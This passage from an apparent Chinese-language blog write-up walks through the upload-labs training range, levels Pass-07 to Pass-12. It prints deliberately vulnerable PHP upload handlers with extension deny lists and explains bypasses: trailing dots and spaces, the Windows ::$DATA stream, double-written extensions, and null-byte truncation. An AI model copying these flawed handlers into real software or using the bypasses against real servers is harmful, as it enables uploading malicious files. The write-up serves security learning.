class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); //转换为小写<br>        <span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);//去除字符串::<span class="hljs-variable">$DATA</span><br>        <span class="hljs-variable">$file_ext</span> = trim(<span class="hljs-variable">$file_ext</span>); //首尾去空<br>        <br>        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;<br>            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>没有去除结尾的” .”（空格+点）,可绕过<br><img src="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107170217501.png" alt="image-20240107170217501"></p><p><img src="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107170307155.png" alt="image-20240107170307155"><br><strong>Pass-08</strong><br>查看源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = null;<br><span class="hljs-keyword">if</span> (isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = array(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_name</span> = deldot(<span class="hljs-variable">$file_name</span>);//删除文件名末尾的点<br>        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); //转换为小写<br>        <span class="hljs-variable">$file_ext</span> = trim(<span class="hljs-variable">$file_ext</span>); //首尾去空<br>        <br>        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-built_in">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).rand(1000,9999).<span class="hljs-variable">$file_ext</span>;<br>            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>发现没有过滤”::$DATA”<br>Windows解析特点：文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理，并不会检测后缀名。<br><img src="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107170314975.png" alt="image-20240107170314975"><br><img src="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107170409789.png" alt="image-20240107170409789"><br><strong>Pass-09</strong><br>查看源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = null;<br><span class="hljs-keyword">if</span> (isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = array(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_name</span> = deldot(<span class="hljs-variable">$file_name</span>);//删除文件名末尾的点<br>        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); //转换为小写<br>        <span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);//去除字符串::<span class="hljs-variable">$DATA</span><br>        <span class="hljs-variable">$file_ext</span> = trim(<span class="hljs-variable">$file_ext</span>); //首尾去空<br>        <br>        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;<br>            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>该题好像各个方面都防御的很好,但是仔细一看会发现,该题先除去了文件后面的点,再除去空格,这里的操作都是一次,所以可以双写绕过<br><img src="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107170422535.png" alt="image-20240107170422535"></p><p><strong>Pass-10</strong><br>查看源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = null;<br><span class="hljs-keyword">if</span> (isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = array(<span class="hljs-string">&quot;php&quot;</span>,<span class="hljs-string">&quot;php5&quot;</span>,<span class="hljs-string">&quot;php4&quot;</span>,<span class="hljs-string">&quot;php3&quot;</span>,<span class="hljs-string">&quot;php2&quot;</span>,<span class="hljs-string">&quot;html&quot;</span>,<span class="hljs-string">&quot;htm&quot;</span>,<span class="hljs-string">&quot;phtml&quot;</span>,<span class="hljs-string">&quot;pht&quot;</span>,<span class="hljs-string">&quot;jsp&quot;</span>,<span class="hljs-string">&quot;jspa&quot;</span>,<span class="hljs-string">&quot;jspx&quot;</span>,<span class="hljs-string">&quot;jsw&quot;</span>,<span class="hljs-string">&quot;jsv&quot;</span>,<span class="hljs-string">&quot;jspf&quot;</span>,<span class="hljs-string">&quot;jtml&quot;</span>,<span class="hljs-string">&quot;asp&quot;</span>,<span class="hljs-string">&quot;aspx&quot;</span>,<span class="hljs-string">&quot;asa&quot;</span>,<span class="hljs-string">&quot;asax&quot;</span>,<span class="hljs-string">&quot;ascx&quot;</span>,<span class="hljs-string">&quot;ashx&quot;</span>,<span class="hljs-string">&quot;asmx&quot;</span>,<span class="hljs-string">&quot;cer&quot;</span>,<span class="hljs-string">&quot;swf&quot;</span>,<span class="hljs-string">&quot;htaccess&quot;</span>);<br><br>        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_name</span> = str_ireplace(<span class="hljs-variable">$deny_ext</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file_name</span>); //如果file_name的值在deny_ext中就替换为空<br>        <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>        <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;        <br>        <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>与前几题不同,这里没有过滤”.”,”::$DATA”等,应该上传对象不是windows,而这里的str_ireplace用来把黑名单里的字符替换成空格,且不区分大小,不可通过大小来替换</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">str_ireplace(find,replace,string,count)<br> 替换字符串中的一些字符（不区分大小写）<br></code></pre></td></tr></table></figure><p>依旧可以双写绕过<br><img src="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107170453506.png" alt="image-20240107170453506"></p><p><strong>Pass-11</strong><br>查看源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = null;<br><span class="hljs-keyword">if</span>(isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$ext_arr</span> = array(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);<br>    <span class="hljs-variable">$file_ext</span> = substr(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],strrpos(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],<span class="hljs-string">&quot;.&quot;</span>)+1);<br>    <span class="hljs-keyword">if</span>(in_array(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$ext_arr</span>))&#123;<br>        <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>        <span class="hljs-variable">$img_path</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;save_path&#x27;</span>].<span class="hljs-string">&quot;/&quot;</span>.rand(10, 99).<span class="hljs-built_in">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_ext</span>;<br><br>        <span class="hljs-keyword">if</span>(move_uploaded_file(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>))&#123;<br>            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>这里使用了白名单,只允许jpg,png,gif后缀上传，但是这里通过$img_path &#x3D; $_GET[‘save_path’].”&#x2F;“.rand(10, 99).date(“YmdHis”).”.”.$file_ext;拼接成文件储存路径,可通过00截断进行绕过</p><p>原理:修改后文件储存路径变成.&#x2F;upload&#x2F;4.php%00&#x2F;随机数&#x2F;.jpg</p><p> 而php相关文件函数会认为%00是结束的标志,就成了..&#x2F;upload&#x2F;4.php</p><p>截断条件：<br>1、php版本小于5.3.4<br>2、php.ini的magic_quotes_gpc为OFF状态<br><img src="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107170600893.png" alt="image-20240107170600893"><br>此处自己没有那么低的php所以偷图来凑</p><p><strong>Pass-12</strong><br>查看源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = null;<br><span class="hljs-keyword">if</span>(isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$ext_arr</span> = array(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);<br>    <span class="hljs-variable">$file_ext</span> = substr(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],strrpos(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],<span class="hljs-string">&quot;.&quot;</span>)+1);<br>    <span class="hljs-keyword">if</span>(in_array(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$ext_arr</span>))&#123;<br>        <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>        <span class="hljs-variable">$img_path</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;save_path&#x27;</span>].<span class="hljs-string">&quot;/&quot;</span>.rand(10, 99).<span class="hljs-built_in">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_ext</span>;<br><br>        <span class="hljs-keyword">if</span>(move_uploaded_file(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>))&#123;<br>            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;上传失败&quot;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>与Pass-11不同,这里用到了POST传值,这里用到的也是00截断</p><p>但是%00指的是一个空字符,代表结束,GET传值因为url编码会把它解析成空字符,而POST传值没有这个特点,所以我们得手动通过通过请求头的hex编码所对应的地方添加00（十六进制）来达到目的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">因此先在upload/后添加任意字符（一般为空格，因为空格对应的hex码为20比较好记）<br>通过hex编码我们可以找到upload/的位置，把它后面的20改为00即可。<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107170611551.png" alt="image-20240107170611551"><br>还是由于这里没有低版的php截不了图</p><p><strong>Pass-13</strong><br><img 